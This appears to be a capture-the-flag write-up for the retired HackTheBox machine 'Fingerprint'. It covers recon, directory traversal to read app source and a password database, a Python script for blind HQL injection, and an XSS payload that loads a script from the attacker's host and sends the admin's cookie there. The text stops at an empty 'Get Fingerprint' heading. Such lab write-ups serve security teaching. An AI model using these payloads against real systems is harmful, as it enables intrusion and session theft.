---
title: HTB: Fingerprint
url: https://0xdf.gitlab.io/2022/05/14/htb-fingerprint.html
date: 2022-05-14T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-fingerprint, nmap, ubuntu, ubuntu-1804, python, werkzeug, feroxbuster, execute-after-redirect, burp, burp-repeater, burp-proxy, glassfish, java, browser-fingerprint, source-code, directory-traversal, flask, proc, hql, hql-injection, boolean-injection, youtube, xss, jwt, jwt-io, deserialization, java-deserialization, maven, jd-gui, java-byte-code, tunnel, crypto, aes, aes-ecb, padding-attack, htb-previse, oswe-like
---

![Fingerprint](https://0xdfimages.gitlab.io/img/fingerprint-cover.png)

For each step in Fingerprint, I’ll have to find multiple vulnerabilities and make them work together to accomplish some goal. To get a shell, I’ll abuse a execute after return (EAR) vulnerability, a directory traversal, HQL injection, cross site scripting, to collect the pieces necessary for the remote exploit. I’ll generate a custom Java serialized payload and abuse a shared JWT signing secret to get execution and a shell. To get to the next user I’ll need to brute force an SSH key character by character using a SUID program, and find the decryption password in a Java Jar. To get root, I’ll need to abuse a new version of one of the initial webservers, conducting a padding attack on the AES cookie to force a malicious admin cookie, and then use the directory traversal to read the root SSH key.

## Box Info

| Name | [Fingerprint](https://hackthebox.com/machines/fingerprint)  [Fingerprint](https://hackthebox.com/machines/fingerprint) [Play on HackTheBox](https://hackthebox.com/machines/fingerprint) |
| --- | --- |
| Release Date | [04 Dec 2021](https://twitter.com/hackthebox_eu/status/1466122942786457609) |
| Retire Date | 14 May 2022 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Fingerprint |
| Radar Graph | Radar chart for Fingerprint |
| First Blood User | 08:39:09[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 23:34:53[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and two HTTP (80, 8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.127
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-06 06:12 EDT
Nmap scan report for 10.10.11.127
Host is up (0.20s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds

oxdf@hacky$ nmap -p 22,80,8080 -sCV -oA scans/nmap-tcpscripts 10.10.11.127
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-06 06:12 EDT
Nmap scan report for 10.10.11.127
Host is up (0.093s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:65:07:35:be:8d:7b:ee:ff:3a:11:96:06:a9:a1:b9 (RSA)
|   256 4c:5b:74:d9:3c:c0:60:24:e4:95:2f:b0:51:84:03:c5 (ECDSA)
|_  256 82:f5:b0:d9:73:18:01:47:61:f7:f6:26:0a:d5:cd:f2 (ED25519)
80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-title: mylog - Starting page
8080/tcp open  http    Sun GlassFish Open Source Edition  5.0.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: secAUTH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.46 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 18.04 Bionic, which is old, but still [supported](https://ubuntu.com/about/release-cycle).

The webservers are Werkzeug and GlassFish, both of which I’ll look at in more depth.

### HTTP - TCP 80

#### Site

The site is for a log management company:

[![image-20211028161136873](https://0xdfimages.gitlab.io/img/image-20211028161136873.png)](https://0xdfimages.gitlab.io/img/image-20211028161136873.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211028161136873.png)

They specifically call out that it’s written in Python, and gives default creds of admin/admin.

The only live link is to `/login`, which leads to a login form:

![image-20211028161359383](https://0xdfimages.gitlab.io/img/image-20211028161359383.png)

admin/admin doesn’t work, nor do any basic SQL injections.

#### Tech Stack

The site says it’s written in Python, which makes sense given the server header says “Server: Werkzeug/1.0.1 Python/2.7.17”.

Werkzeug is a Python Web Server Gateway Interface (WSGI) Application. It handles how the web server communicates with the web applications. So in this case, the application is likely written in a Python framework like Flask or Django, and Werkzeug is handling things like scaling. [This post](https://www.fullstackpython.com/wsgi-servers.html) does a good job going into more detail.

#### Directory Brute Force

I’ll run `feroxbuster` against the site with no extensions given it’s Python:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.127

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.127
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302       61l      110w     1673c http://10.10.11.127/admin
200       36l       77w     1014c http://10.10.11.127/login
[####################] - 2m     29999/29999   0s      found:2       errors:0      
[####################] - 2m     29999/29999   238/s   http://10.10.11.127

```

The new path is `/admin`. `feroxbuster` shows it returns a 302, which makes sense as I’m not logged in.

#### /admin

Visiting `/admin` in Firefox ends up at `/login`. However, looking at the request in Burp, it is returning a 302, but it’s also returning the page:

![image-20211106062447038](https://0xdfimages.gitlab.io/img/image-20211106062447038.png)

This is an [execute after redirect (EAR) vulnerability](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)). I ran into this before in [Previse](/2022/01/08/htb-previse.html#website---tcp-80). I’ll add a “match/replace” rule in Burp under Proxy -> Options -> Match and Replace to set the response to 200 so I can view the site:

![image-20211028162622904](https://0xdfimages.gitlab.io/img/image-20211028162622904.png)

Now `/admin` loads:

![image-20211106065620660](https://0xdfimages.gitlab.io/img/image-20211106065620660.png)

The blue eye button leads to `/admin/view/auth.log`.

If I play around with the login form on 8080, there are logs generated here:

![image-20220509150427073](https://0xdfimages.gitlab.io/img/image-20220509150427073.png)

### HTTP - TCP 8080

#### Site

The site is for a authentication provider:

[![image-20211028164536029](https://0xdfimages.gitlab.io/img/image-20211028164536029.png)](https://0xdfimages.gitlab.io/img/image-20211028164536029.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211028164536029.png)

The only non-Lorem-Ipsum text on the page says:

> We use sophisticated methods to prevent account theft

The only link on the page that goes anywhere is “Authenticate Now”, which leads to `/login` and a login form:

![image-20211028164614090](https://0xdfimages.gitlab.io/img/image-20211028164614090.png)

#### Tech Stack

The response headers from this server show it is running [GlassFish](https://en.wikipedia.org/wiki/GlassFish), an open source web server based in Java:

```

HTTP/1.1 200 OK
Server: GlassFish Server Open Source Edition  5.0.1 
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)
Accept-Ranges: bytes
ETag: W/"13020-1635094923000"
Last-Modified: Sun, 5 Dec 2021 17:02:03 GMT
Content-Type: text/html
Connection: close
Content-Length: 13020

```

It’s use Java Server Pages (JSP) for the application.

When I submit the login, the POST request has an extra parameter:

```

POST /login HTTP/1.1
Host: 10.10.11.127:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://10.10.11.127:8080
Connection: close
Referer: http://10.10.11.127:8080/login
Cookie: JSESSIONID=240bc5f774b68ff4a93d870007e6
Upgrade-Insecure-Requests: 1

uid=0xdf&auth_primary=password&auth_secondary=97c98f6f98fb6ac11d06f7239847c7a7

```

`uid` and `auth_primary` are the entered username and passwords. So what is `auth_secondary`?

Going into the dev tools and searching for it, there are two matches:

[![image-20211102160814870](https://0xdfimages.gitlab.io/img/image-20211102160814870.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211102160814870.png)

The first is a hidden input field. The second is some JavaScript that’s setting that value to the output of `getFingerPrintID()`.

The function is defined in `resources/js/login.js`:

[![image-20211102161032249](https://0xdfimages.gitlab.io/img/image-20211102161032249.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211102161032249.png)

`login.js` up to this point is just defining an MD5 function. This function takes a ton of properties from the `navigator` object and combines them into a string and hashes them using that `MD5` function.

If I set a break point at the `return MD5(fingerprint)` line, I can see that the `navigator` object is a bunch of information about my browser:

[![image-20211102161315279](https://0xdfimages.gitlab.io/img/image-20211102161315279.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211102161315279.png)

This is an attempt to fingerprint my browser. This must be the special auth the page was talking about.

#### Directory Brute Force

`feroxbuster` returns a good number of paths, but the most interesting is `/backups`:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.127:8080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.127:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
405        1l       74w     1184c http://10.10.11.127:8080/upload
301        6l       13w      185c http://10.10.11.127:8080/resources
301        6l       13w      188c http://10.10.11.127:8080/resources/js
301        6l       13w      189c http://10.10.11.127:8080/resources/css
301        6l       13w      183c http://10.10.11.127:8080/WEB-INF
301        6l       13w      183c http://10.10.11.127:8080/backups
301        6l       13w      187c http://10.10.11.127:8080/WEB-INF/lib
301        6l       13w      191c http://10.10.11.127:8080/WEB-INF/classes
200       72l      113w     1733c http://10.10.11.127:8080/login
302        6l       13w      180c http://10.10.11.127:8080/welcome
301        6l       13w      184c http://10.10.11.127:8080/META-INF
301        6l       13w      195c http://10.10.11.127:8080/WEB-INF/classes/com
301        6l       13w      201c http://10.10.11.127:8080/WEB-INF/classes/com/admin
301        6l       13w      190c http://10.10.11.127:8080/resources/dist
301        6l       13w      197c http://10.10.11.127:8080/resources/dist/images
301        6l       13w      193c http://10.10.11.127:8080/resources/dist/js
301        6l       13w      194c http://10.10.11.127:8080/resources/dist/css
401        1l       52w     1094c http://10.10.11.127:8080/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/WEB-INF/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/WEB-INF/lib/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/WEB-INF/classes/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/css/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/backups/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/js/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/META-INF/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/WEB-INF/classes/com/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/dist/images/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/dist/js/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/dist/css/j_security_check
401        1l       52w     1094c http://10.10.11.127:8080/resources/dist/j_security_check
...[snip]...

```

`/backups` returns a 301, which `curl` shows is just a redirect to add the trailing `/`. Interestingly, visiting the url returns 404:

![image-20211106070755361](https://0xdfimages.gitlab.io/img/image-20211106070755361.png)

I’ll run `feroxbuster` again on this path, and because it’s a backup directory, I’ll look for source and other files like `.java`, `.jsp`, `.xml`, and `.class`:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.127:8080/backups -x java,jsp,xml,class

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.127:8080/backups
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [java, jsp, xml, class]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       54l      122w     1444c http://10.10.11.127:8080/backups/User.java
200       43l       99w     1060c http://10.10.11.127:8080/backups/Profile.java
401        1l       52w     1094c http://10.10.11.127:8080/backups/j_security_check
[####################] - 5m    149995/149995  0s      found:3       errors:0      
[####################] - 5m    149995/149995  498/s   http://10.10.11.127:8080/backups

```

It finds two `.java` files, `User.java` and `Profile.java`.

I’ll grab both of those with `wget`.

### Source Analysis

#### User.java

The `User.java` file defines the `User` class:

```

package com.admin.security.src.model;

import com.admin.security.src.utils.FileUtil;
import com.admin.security.src.utils.SerUtils;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import javax.persistence.*;
import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.Paths;

// import com.admin.security.src.model.UserProfileStorage;
@AllArgsConstructor
@NoArgsConstructor
@Entity
@Data
@Table(name = "users")
public class User implements Serializable {
    private static final long serialVersionUID = -7780857363453462165L;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    protected int id;

    @Column(name = "username")
    protected String username;

    @Column(name = "password")
    protected String password;

    @Column(name = "fingerprint")
    protected String fingerprint;

    public File getProfileLocation() {
        final File dir = new File("/data/sessions/");
        dir.mkdirs();

        final String pathname = dir.getAbsolutePath() + "/" + username + ".ser";
        return Paths.get(pathname).normalize().toFile();
    }

    public boolean isAdmin() {
        return username.equals("admin");
    }

    public void updateProfile(final Profile profile) throws IOException {
        final byte[] res = SerUtils.toByteArray(profile);
        FileUtil.write(res, getProfileLocation());
    }
}

```

It ties into the DB, and has columns for `id`, `username`, `password`, and `fingerprint`. The function `getProfileLocation` will get the path `/data/sessions/{username}.ser`. The `updateProfile` function uses `SerUtils` to write a serialized object of the profile into the file.

There’s also a comment referring to a `UserProfileStorage` class. That file exists in the backup folder as well:

```

oxdf@hacky$ wget http://10.10.10.141:8080/backup_files/UserProfileStorage.java
--2021-11-02 15:08:36--  http://10.10.10.141:8080/backup_files/UserProfileStorage.java
Connecting to 10.10.10.141:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1775 (1.7K) [text/plain]
Saving to: ‘UserProfileStorage.java’

UserProfileStorage.java                                             100%[=============================================>]   1.73K  --.-KB/s    in 0s      

2021-11-02 15:08:36 (97.4 MB/s) - ‘UserProfileStorage.java’ saved [1775/1775]

```

#### UserProfileStorage.java

`UserProfileStorage` has a rather obvious command injection in the `readProfile` function:

```

package com.admin.security.src.profile;

import com.admin.security.src.model.Profile;
import com.admin.security.src.model.User;
import com.admin.security.src.utils.SerUtils;
import com.admin.security.src.utils.Terminal;
import lombok.AllArgsConstructor;
import lombok.Data;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;

import static com.admin.security.src.profile.Settings.AUTH_LOG;

@Data
@AllArgsConstructor
public class UserProfileStorage implements Serializable {
    private static final long serialVersionUID = -5667788713462095525L;

    private final User user;

    private void readObject(final ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
        inputStream.defaultReadObject();
        readProfile();
    }

    public Profile readProfile() throws IllegalStateException {

        final File profileFile = user.getProfileLocation();

        try {
            final Path path = Paths.get(profileFile.getAbsolutePath());
            final byte[] content = Files.readAllBytes(path);

            final Profile profile = (Profile) SerUtils.from(content);
            if (profile.isAdminProfile()) { // load authentication logs only for super user
                profile.getLogs().clear();
                final String cmd = "cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();
                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split("\n")));
            }
            return profile;
        } catch (final Exception e) {
            throw new IllegalStateException("Error fetching profile");
        }
    }
}

```

These two lines are unsafe:

```

final String cmd = "cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();
                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split("\n")));

```

If I can control `AUTH_LOG.getAbsolutePath()` or `user.getUsername()`, I can get execution.

To get to that point in the code, `profile.isAdminProfile()`. `profile` is read in from the file.

`readProfile` is called by the `readObject` function.

#### Profile.java

This script defines a `Profile` class:

```

package com.admin.security.src.model;

import com.admin.security.src.profile.UserProfileStorage;
import lombok.Data;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

@Data
public class Profile implements Serializable {
    private static final long serialVersionUID = 3995854114743474071L;

    private final List<String> logs;
    private final boolean adminProfile;

    private File avatar;

    public static Profile getForUser(final User user) {
        // fetch locally saved profile
        final File file = user.getProfileLocation();

        Profile profile;

        if (!file.isFile()) {
            // no file -> create empty profile
            profile = new Profile(new ArrayList<>(), user.isAdmin());
            try {
                user.updateProfile(profile);
            } catch (final IOException ignored) {
            }
        }

        // init logs etc.
        profile = new UserProfileStorage(user).readProfile();

        return profile;

    }

}

```

The `@Data` decorator [will generate](https://www.baeldung.com/lombok-getter-boolean) the `isAdminProfile()` function from the `adminProfile` boolean.

## Shell as www-data

### Path Traversal

#### Identify

There’s a path traversal vulnerability in the log display on `/admin` of the port 80 site:

[![image-20211106071052256](https://0xdfimages.gitlab.io/img/image-20211106071052256.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211106071052256.png)

I’ll also note the flask user, which suggests that’s the framework running the site.

#### Find Flask Source

I originally just guessed/fuzzed the directory traversal to find the source for the flask application at `/home/flask/app/app.py`:

[![image-20211106071137486](https://0xdfimages.gitlab.io/img/image-20211106071137486.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211106071137486.png)

I could also use `/proc/self`. The `cmdline` shows it’s Flask:

```

oxdf@hacky$ curl -s 10.10.11.127/admin/view/../../proc/self/cmdline --path-as-is -o- | tr '\000' ' '
/usr/bin/python2.7 /usr/local/bin/flask run --host=0.0.0.0 --port=80

```

For some reason, I can’t read the`environ` file:

```

oxdf@hacky$ curl -s 10.10.11.127/admin/view/../../../proc/self/environ --path-as-is -o- | tr '\000' '\n'
No such log found!

```

But, I can use `cwd` to get the directory the application is running from, and guess that the file is `app.py`:

```

oxdf@hacky$ curl -s 10.10.11.127/admin/view/../../proc/self/cwd/app.py --path-as-is
from flask import Flask, redirect, request, render_template, session, g, url_for, send_file, make_response    
...[snip]...

```

#### Flask Source Analysis

From `app.py`, I’ll note:
- The SECRET\_KEY is `SjG$g5VZ(vHC;M2Xc/2~z(`.
- There’s an `auth.py` as well where the `check` function is imported (or there’s a folder `auth` with `check.py`)

I’ll grab `auth.py` the same way:

[![image-20211106071214604](https://0xdfimages.gitlab.io/img/image-20211106071214604.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211106071214604.png)

This file shows connecting to a `users.db` SQLite file.

I’ll download it with `curl`:

```

oxdf@hacky$ curl --path-as-is -o users.db 'http://10.10.11.127/admin/view/../../../../home/flask/app/users.db'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8192  100  8192    0     0   145k      0 --:--:-- --:--:-- --:--:--  145k

```

There’s a single table with a single row with an admin user and a clear text password:

```

oxdf@hacky$ sqlite3 users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
0|admin|u_will_never_guess_this_password

```

With this, I can log into the site:

![image-20211105063756178](https://0xdfimages.gitlab.io/img/image-20211105063756178.png)

And now visiting `/admin` returns a 200, and I can turn off my rule in Burp re-writing 302 redirects.

### HQL Injection

#### Identify

If I add a `'` to my username and try to log into the GlassFish site, it crashes:

![image-20211102161521015](https://0xdfimages.gitlab.io/img/image-20211102161521015.png)

Some googling leads to [Hibernate](https://hibernate.org/). Hibernate [is an object oriented query language](https://www.tutorialspoint.com/hibernate/hibernate_query_language.htm) (HQL), similar to SQL, but using objects / properties rather than tables, rows, and columns.

#### Login Bypass Failure #1

At this point I can guess that the query on the server looks something like:

```

select * from users where uid='{uid}' and password='{password}' and fingerprint_id='{fingerprint_id}';

```

So I could potentially bypass the login by giving a `uid` of `0xdf' or '1'='1`, which would make it:

```

select * from users where uid='0xdf' or '1'='1' and password='{password}' and fingerprint_id='{fingerprint_id}';

```

When I send that, a new exception comes back:

```

 <pre>javax.persistence.NonUniqueResultException: query did not return a unique result: 2</pre>

```

So there are two users in the database, and it returned both, which caused an error, as the site expected only one match.

#### Login Bypass Failure #2

Unfortunately for me, there’s [no limit in HQL](https://stackoverflow.com/questions/1239723/how-do-you-do-a-limit-query-in-jpql-or-hql). It’s set in a different way, and not something I can mess with via this injection.

There is a [RAND](https://hadoopsters.com/2018/02/04/how-random-sampling-in-hive-works-and-how-to-use-it/) function that returns a random double between 0 and 1. I’ll set my username to `0xdf' or rand() > 0.5 or '1'='0`, which makes:

```

select * from users where uid='0xdf' or rand() > 0.5 or '1'='0' and password='{password}' and fingerprint_id='{fingerprint_id}';

```

The random value will be generated for each row. Because I know there are two rows, there are three possible outcomes - zero results, one result, or two results.

If I send a bunch of times, I’ll see all three. Sometimes it returns 200 with the login page:

![image-20211102163704601](https://0xdfimages.gitlab.io/img/image-20211102163704601.png)

This must be the case where zero results come back.

Other times, I get the error page for having two:

![image-20211102163740745](https://0xdfimages.gitlab.io/img/image-20211102163740745.png)

The interesting one is the third result:

![image-20211102163822486](https://0xdfimages.gitlab.io/img/image-20211102163822486.png)

It must be checking the fingerprint ID outside of the original query.

#### Brute Force Protection

The site mentioned there was brute force protection. I didn’t originally discover this until later when I was doing the blind injection, but it makes more sense to show it here. If I try to login many times in a row quickly, it will eventually stop returning the typical response and instead give:

```

HTTP/1.1 200 OK
Server: GlassFish Server Open Source Edition  5.0.1 
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)
Content-Type: text/html;charset=ISO-8859-1
Connection: close
Content-Length: 16

You are blocked

```

To play with this a bit more, I can see it happens on the 45th attempt:

```

oxdf@hacky$ for i in {1..50}; do echo -n "$i  "; curl -s http://10.10.11.127:8080/login -d 'uid=0xdf&auth_primary=0xdf&auth_secondary=97c98f6f98fb6ac11d06f7239847c7a4' | gr
ep -e Invalid -e blocked; done
1      Invalid credentials given
2      Invalid credentials given
3      Invalid credentials given
4      Invalid credentials given
5      Invalid credentials given
...[snip]...
41      Invalid credentials given
42      Invalid credentials given
43      Invalid credentials given
44      Invalid credentials given
45  You are blocked
46  You are blocked
47  You are blocked
48  You are blocked
49  You are blocked
50  You are blocked

```

Interestingly, changing the fingerprint unblocks me. When I want to brute force the blind injection, I’ll want to use a random fingerprint each time to avoid being blocked.

#### Blind Injection

Because I have an injection that returns different responses based on the injection, I can do a blind injection. [This post](https://medium.com/@misc_heading/exploiting-a-hql-injection-895f93d06718) gives an example, but you have to guess the fields in the database to make it work.

I tried guessing that the username might be stored in `uid` with a username like `0xdf' or uid like 'b%` (though the `%` needs to be encoded to `%25`), and it returned Invalid Credentials. When I try with `'a%`, it returned Invalid fingerprint-ID. Now I have a way to brute force any column I can guess.

I was able to guess objects “username”, “password”, and “fingerprint”.

Here’s a [video](https://www.youtube.com/watch?v=1efIJEzVR54) of how I wrote the brute force script:

Here’s the final script, though as I showed in the video, it changes a good bit:

```

#!/usr/bin/env python3

import random
import requests
import string

def get_next_char(obj, known, alpha):
    for c in alpha:
        print(f'\r{known}{c}', end="\x1b[2K")
        resp = requests.post(
            "http://10.10.11.127:8080/login",
            data={
                "uid": f"0xdf' or {obj} like '{known}{c}%",
                "auth_primary": "",
                "auth_secondary": f"{random.getrandbits(128):32x}",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            #proxies={"http": "http://127.0.0.1:8080"},
        )
        if 'Invalid fingerprint-ID' in resp.text or 'query did not return a unique result' in resp.text:
            resp = requests.post(
                "http://10.10.11.127:8080/login",
                data={
                     "uid": f"0xdf' or {obj}='{known}{c}",
                     "auth_primary": "",
                     "auth_secondary": f"{random.getrandbits(128):32x}",
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                #proxies={"http": "http://127.0.0.1:8080"},
            )
            if 'Invalid fingerprint-ID' in resp.text:
                print(f'\33[2k\r{known}{c:<64}')
                return
            get_next_char(obj, f'{known}{c}', alpha)

print("Usernames:")
get_next_char('username', '', string.ascii_lowercase + string.digits)
print("\rPasswords:")
get_next_char('password', '', string.ascii_lowercase + string.digits + '#$&+=<>[]')
print("\rFingerprints:")
get_next_char('fingerprint', '', 'abcdef' + string.digits)
print("\x1b[2K")

```

I came away with two usernames, two passwords, and two fingerprints:

```

oxdf@hacky$ python hqli.py   
Usernames:                                            
admin                                                                
micheal1235
Passwords:                          
lwg7gur1emx7unxsjxqz
o9vb0kb9kuzj1dtxzlv8
Fingerprints:                                      
7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6
99cd639f9e163767115029a31acd97bfa19344b6202ac0b8bdd586e46f436666  

```

I’m not sure what these passwords are. They don’t work as plain-text passwords. They are case-insensitive. – case insensitive - username input is being lowercased!

The fingerprints are not MD5s, which suggests that perhaps they are hashed again before storing them in the database.

### XSS

#### Identify

I’ll note that my username on the 8080 login is logged in a readable way. There’s an XSS vulnerability in this `/admin` page, and it’s possible that the admin is viewing them.

So if I log in with a `<script>` tag in my username:

![image-20211106104106088](https://0xdfimages.gitlab.io/img/image-20211106104106088.png)

When I visit `/admin/view/auth.log`, there’s a popup:

![image-20211106104037358](https://0xdfimages.gitlab.io/img/image-20211106104037358.png)

#### Identify Admin XSS

I can load remote scripts as well, like with a username of `<script src="http://10.10.14.6/xss.js"></script>`. On entering that and then viewing the log, I see a connection at my webserver:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.6 - - [03/Nov/2021 08:44:20] code 404, message File not found
10.10.14.6 - - [03/Nov/2021 08:44:20] "GET /xss.js HTTP/1.1" 404 -

```

A bit later, there’s a connection from Fingerprint as well:

```
10.10.11.127 - - [05/Dec/2021 08:44:51] code 404, message File not found
10.10.11.127 - - [05/Dec/2021 08:44:51] "GET /xss.js HTTP/1.1" 404 -

```

It’s worth noting that the logs are cleared periodically, so I may need to resubmit.

#### Exfil Cookie

My first thought was to exfil the cookie of the admin. I created some simple JavaScript in `xss.js`:

```

var req = new XMLHttpRequest();
req.open("GET", "http://10.10.14.6/?" + document.cookie, false);
req.send();

```

When the admin next checked the page, I got a cookie back:

```
10.10.11.127 - - [03/Nov/2021 08:48:51] "GET /xss.js HTTP/1.1" 200 -
10.10.11.127 - - [03/Nov/2021 08:48:52] "GET /?user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb HTTP/1.1" 200 -

```

Unfortunately, this cookie in theory would only help me access the site that I’m already accessing, and that I have the source for. In reality, this cookie doesn’t seem to work on the site either. Looking at the cookie that was generated when I successfully logged in as admin, the cookie that is set is called `session` and it’s a flask cookie:

```

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://10.10.10.141/admin
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjoiYWRtaW4ifQ.YYUKiQ.ZEiAGV_kKNLV_tcVFa1ezMrMqbk; HttpOnly; Path=/
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Fri, 05 Nov 2021 10:42:17 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/admin">/admin</a>.  If not click the link.

```

It decodes with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager):

```

oxdf@hacky$ flask_session_cookie_manager3.py decode -c eyJ1c2VyX2lkIjoiYWRtaW4ifQ.YYUKiQ.ZEiAGV_kKNLV_tcVFa1ezMrMqbk
b'{"user_id":"admin"}'

```

This cookie from the XSS is not that, but something different. I can’t explain it right now, but it will be valuable later.

#### Get Fingerprint

